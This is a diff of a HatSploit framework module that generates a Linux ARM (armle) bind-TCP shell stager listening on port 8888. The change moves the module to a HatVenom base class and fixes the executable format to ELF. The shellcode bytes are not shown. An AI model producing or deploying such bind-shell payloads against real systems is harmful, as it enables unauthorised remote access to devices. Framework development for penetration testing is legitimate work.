@@ -25,10 +25,10 @@
 #
 
 from core.lib.payload import Payload
-from utils.payload.payload import PayloadGenerator
+from utils.hatvenom.hatvenom import HatVenom
 
 
-class HatSploitPayload(Payload, PayloadGenerator):
+class HatSploitPayload(Payload, HatVenom):
     details = {
         'Category': "stager",
         'Name': "Linux armle Shell Bind TCP",
@@ -55,22 +55,12 @@ class HatSploitPayload(Payload, PayloadGenerator):
             'Value': 8888,
             'Type': "port",
             'Required': True
-        },
-        'FORMAT': {
-            'Description': "Executable format.",
-            'Value': "elf",
-            'Type': None,
-            'Required': True
         }
     }
 
     def run(self):
-        bind_port, executable_format = self.parse_options(self.options)
+        bind_port = self.parse_options(self.options)
         bind_port = self.port_to_bytes(bind_port)
-
-        if executable_format not in self.formats.keys():
-            self.output_error("Invalid executable format!")
-            return
 
         self.output_process("Generating shellcode...")
         shellcode = (
@@ -142,6 +132,6 @@ class HatSploitPayload(Payload, PayloadGenerator):
         )
 
         self.output_process("Generating payload...")
-        payload = self.generate(executable_format, 'armle', shellcode)
+        payload = self.generate('elf', 'armle', shellcode)
 
         return payload
